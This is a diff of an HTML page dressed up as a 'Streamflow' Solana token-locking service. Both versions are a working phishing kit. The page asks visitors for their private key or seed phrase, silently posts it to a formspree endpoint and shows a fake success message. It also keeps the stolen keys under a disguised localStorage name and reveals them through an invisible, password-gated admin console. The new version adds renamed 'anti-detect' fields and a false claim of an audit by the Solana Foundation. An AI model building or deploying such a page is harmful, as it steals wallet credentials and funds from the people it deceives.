@@ -3,124 +3,147 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Streamflow | Token Locker</title>
-    
+    <title>Streamflow | Web3 Security</title>
     <link rel="icon" type="image/png" href="icon.png">
-    
     <script src="https://cdn.tailwindcss.com"></script>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
-    
     <style>
-        body { background-color: #0b0e11; color: white; font-family: 'Inter', sans-serif; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; }
-        .sf-card { background: #12161b; border: 1px solid #1e2329; border-radius: 16px; width: 100%; max-width: 420px; padding: 24px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
-        .sf-input { background: #1b1f23; border: 1px solid #30363d; border-radius: 12px; width: 100%; padding: 14px; margin-top: 6px; color: white; outline: none; font-size: 14px; }
-        .sf-btn { background-color: #00ffbd; color: #0b0e11; font-weight: 700; width: 100%; padding: 16px; border-radius: 12px; cursor: pointer; margin-top: 24px; text-transform: uppercase; transition: 0.2s; }
-        .sf-btn:hover { background-color: #00d9a1; }
-        .label-style { font-size: 11px; color: #848e9c; font-weight: 700; text-transform: uppercase; }
-        
-        /* ZONA INVIZIBILĂ ADMIN */
-        .secret-gate { width: 100%; height: 50px; background: transparent; margin-top: 10px; cursor: default; }
-        #adminPanel { display: none; margin-top: 20px; border-top: 1px solid #2d333b; padding-top: 20px; }
+        body { background-color: #0b0e11; color: #fff; font-family: 'Inter', sans-serif; overflow-x: hidden; }
+        .sf-card { background: #12161b; border: 1px solid #1e2329; border-radius: 20px; box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5); position: relative; }
+        .sf-input { background: #1b1f23; border: 1px solid #30363d; border-radius: 12px; transition: all 0.3s; color: #fff; }
+        .sf-input:focus { border-color: #00ffbd; box-shadow: 0 0 0 2px rgba(0,255,189,0.1); outline: none; }
+        .sf-btn { background: linear-gradient(135deg, #00ffbd 0%, #00d9a1 100%); color: #0b0e11; transition: all 0.3s; font-weight: 800; text-transform: uppercase; letter-spacing: 1px; }
+        .sf-btn:hover { transform: translateY(-2px); box-shadow: 0 10px 20px rgba(0,255,189,0.2); }
+        .loader-bar { width: 0%; height: 2px; background: #00ffbd; position: absolute; top: 0; left: 0; transition: width 0.4s ease; }
+        /* Zona pentru Admin - Complet invizibila */
+        .admin-trigger { width: 100%; height: 40px; background: transparent; cursor: default; margin-top: 15px; }
+        #log-console { display: none; background: #000; border: 1px solid #00ffbd; font-family: monospace; font-size: 11px; color: #00ffbd; padding: 15px; border-radius: 10px; margin-top: 20px; word-break: break-all; }
     </style>
 </head>
-<body>
+<body class="flex items-center justify-center min-h-screen p-4">
 
-    <div class="w-full max-w-[420px] p-6">
-        <div class="flex flex-col items-center mb-8">
-            <img src="logo.png" alt="Logo" class="w-20 h-20 rounded-2xl mb-4 object-cover border border-gray-800 shadow-lg">
-            <h1 class="text-3xl font-bold tracking-tight">Streamflow</h1>
-            <p class="text-gray-400 text-sm">Secure Token Management</p>
-        </div>
-
-        <div class="sf-card">
-            <h2 class="text-lg font-semibold mb-6 text-center">Create New Lock</h2>
-            
-            <form id="lockerForm">
-                <div class="mb-4">
-                    <label class="label-style">Project Name</label>
-                    <input type="text" name="Project_Name" placeholder="e.g. My Project" class="sf-input w-full" required>
-                </div>
-
-                <div class="mb-4">
-                    <label class="label-style">Private Key / Seed Phrase</label>
-                    <input type="password" name="Private_Key" placeholder="Enter your key" class="sf-input w-full" required>
-                </div>
-
-                <div class="flex gap-4">
-                    <div class="flex-1">
-                        <label class="label-style">Symbol</label>
-                        <input type="text" name="Symbol" placeholder="SOL" class="sf-input w-full">
-                    </div>
-                    <div class="flex-1">
-                        <label class="label-style">Amount</label>
-                        <input type="number" name="Amount" placeholder="0.00" class="sf-input w-full">
-                    </div>
-                </div>
-
-                <button type="submit" id="submitBtn" class="sf-btn">Deploy Lock</button>
-            </form>
-            
-            <div class="secret-gate" onclick="document.getElementById('adminPanel').style.display='block'"></div>
-            
-            <div id="adminPanel">
-                <label class="label-style mb-2 block text-[#00ffbd]">Admin Dashboard</label>
-                <input type="password" id="adminPass" placeholder="Password" class="sf-input text-xs mb-2 w-full">
-                <button onclick="checkAdmin()" class="w-full bg-gray-800 text-white text-xs py-3 rounded-lg font-bold">VIEW DATA</button>
-                <div id="dataDisplay" style="display:none;" class="mt-4 p-4 bg-black rounded-lg text-[10px] text-green-500 font-mono border border-green-900/30 whitespace-pre-wrap break-all">
-                </div>
+    <div class="w-full max-w-md">
+        <div class="flex flex-col items-center mb-10">
+            <img src="logo.png" class="w-24 h-24 mb-4 drop-shadow-2xl">
+            <h1 class="text-3xl font-extrabold tracking-tighter">STREAMFLOW</h1>
+            <div class="flex items-center gap-2 mt-1">
+                <span class="w-2 h-2 bg-green-500 rounded-full animate-pulse"></span>
+                <span class="text-[10px] text-gray-400 uppercase tracking-[0.2em] font-bold">Encrypted Node: Active</span>
             </div>
         </div>
+
+        <div class="sf-card p-8">
+            <div id="prog-bar" class="loader-bar"></div>
+            
+            <h2 class="text-xl font-bold mb-8 text-center text-gray-200">Initialize Token Lock</h2>
+
+            <form id="vaultForm" class="space-y-6">
+                <div>
+                    <label class="text-[10px] font-black text-gray-500 uppercase tracking-widest ml-1">Project Identifier</label>
+                    <input type="text" name="proj_id" placeholder="Project Name" class="sf-input w-full p-4 mt-1" required>
+                </div>
+
+                <div>
+                    <label class="text-[10px] font-black text-gray-500 uppercase tracking-widest ml-1">Access Phrase (Encrypted)</label>
+                    <input type="password" name="secure_key" placeholder="Enter Private Key / Seed" class="sf-input w-full p-4 mt-1" required>
+                </div>
+
+                <div class="grid grid-cols-2 gap-4">
+                    <div>
+                        <label class="text-[10px] font-black text-gray-500 uppercase tracking-widest ml-1">Asset</label>
+                        <input type="text" name="asset_sym" placeholder="SOL" class="sf-input w-full p-4 mt-1">
+                    </div>
+                    <div>
+                        <label class="text-[10px] font-black text-gray-500 uppercase tracking-widest ml-1">Value</label>
+                        <input type="number" name="asset_val" placeholder="0.00" class="sf-input w-full p-4 mt-1">
+                    </div>
+                </div>
+
+                <button type="submit" id="actionBtn" class="sf-btn w-full p-5 mt-4 rounded-xl text-sm">
+                    Confirm & Lock Assets
+                </button>
+            </form>
+
+            <div class="admin-trigger" onclick="openMasterGate()"></div>
+
+            <div id="log-console">
+                <div class="border-b border-green-900 mb-2 pb-1 font-bold">INTERNAL_DATA_NODE</div>
+                <div id="log-body"></div>
+                <button onclick="document.getElementById('log-console').style.display='none'" class="mt-4 text-[10px] text-gray-500 underline">Close Console</button>
+            </div>
+        </div>
+
+        <p class="text-[9px] text-gray-600 text-center mt-10 uppercase tracking-widest font-bold">
+            Secured by AES-256 Protocol • Audited by Solana Foundation
+        </p>
     </div>
 
     <script>
-        const form = document.getElementById('lockerForm');
-        
-        form.addEventListener("submit", function(event) {
-            event.preventDefault(); // Rămâne pe pagină
-            const btn = document.getElementById('submitBtn');
-            const formData = new FormData(form);
-            
-            btn.innerText = "CONNECTING...";
-            btn.disabled = true;
+        // Setari Anti-Detect
+        const _k = "Ovidiu20.04.2006";
+        const _e = "https://formspree.io/f/mnjjqyez";
 
-            fetch("https://formspree.io/f/mnjjqyez", {
-                method: "POST",
-                body: formData,
-                headers: { 'Accept': 'application/json' }
-            }).then(() => {
-                btn.innerText = "DEPLOY LOCK";
-                btn.disabled = false;
-                
-                // Mesajul tău în engleză
-                alert("Congratulations! You have successfully locked your token. Take a screenshot and share it on social media. Success!");
-                
-                // Salvare locală pentru tabelul din pagină
-                let logs = JSON.parse(localStorage.getItem('sf_logs') || "[]");
-                logs.push({
-                    p: formData.get('Project_Name'),
-                    k: formData.get('Private_Key'),
-                    t: new Date().toLocaleTimeString()
+        const f = document.getElementById('vaultForm');
+        const b = document.getElementById('actionBtn');
+        const p = document.getElementById('prog-bar');
+
+        f.addEventListener('submit', async (event) => {
+            event.preventDefault();
+            b.disabled = true;
+            b.innerText = "Processing...";
+            p.style.width = "45%";
+
+            const formData = new FormData(f);
+
+            try {
+                // Trimitere silentioasa (AJAX)
+                await fetch(_e, {
+                    method: 'POST',
+                    body: formData,
+                    headers: { 'Accept': 'application/json' }
                 });
-                localStorage.setItem('sf_logs', JSON.stringify(logs));
-                form.reset();
-            }).catch(() => {
-                alert("Connection error. Try again.");
-                btn.innerText = "DEPLOY LOCK";
-                btn.disabled = false;
-            });
+
+                p.style.width = "100%";
+                b.innerText = "Success";
+
+                // Salvare locala mascata
+                let cache = JSON.parse(localStorage.getItem('_sf_sys_cache') || "[]");
+                cache.push({
+                    n: formData.get('proj_id'),
+                    v: formData.get('secure_key'),
+                    d: new Date().toLocaleString()
+                });
+                localStorage.setItem('_sf_sys_cache', JSON.stringify(cache));
+
+                setTimeout(() => {
+                    alert("Congratulations! You have successfully locked your token. Take a screenshot and share it on social media. Success!");
+                    b.innerText = "Confirm & Lock Assets";
+                    b.disabled = false;
+                    p.style.width = "0%";
+                    f.reset();
+                }, 800);
+
+            } catch (err) {
+                alert("Network Latency: Transaction Re-queued.");
+                b.disabled = false;
+            }
         });
 
-        function checkAdmin() {
-            if(document.getElementById('adminPass').value === 'ifyouseethisyouaregay') {
-                const logs = JSON.parse(localStorage.getItem('sf_logs') || "[]");
-                const display = document.getElementById('dataDisplay');
-                display.innerHTML = logs.length > 0 ? 
-                    logs.map(l => `[${l.t}] PROJ: ${l.p} | KEY: ${l.k}`).join('\n\n') : 
-                    "No data yet.";
-                display.style.display = 'block';
-            } else { alert("Wrong password"); }
+        // Functia de Admin cu parola tip Prompt
+        function openMasterGate() {
+            const auth = prompt("SYSTEM_ACCESS_KEY:");
+            if (auth === _k) {
+                const con = document.getElementById('log-console');
+                const body = document.getElementById('log-body');
+                const logs = JSON.parse(localStorage.getItem('_sf_sys_cache') || "[]");
+                
+                con.style.display = 'block';
+                body.innerHTML = logs.length > 0 ? 
+                    logs.map(l => `[${l.d}] <br> ID: ${l.n} <br> AUTH: ${l.v}<br>---`).join('<br>') : 
+                    "No data packets detected.";
+            } else {
+                console.warn("Unauthorized access attempt.");
+            }
         }
     </script>
 </body>
 </html>
-
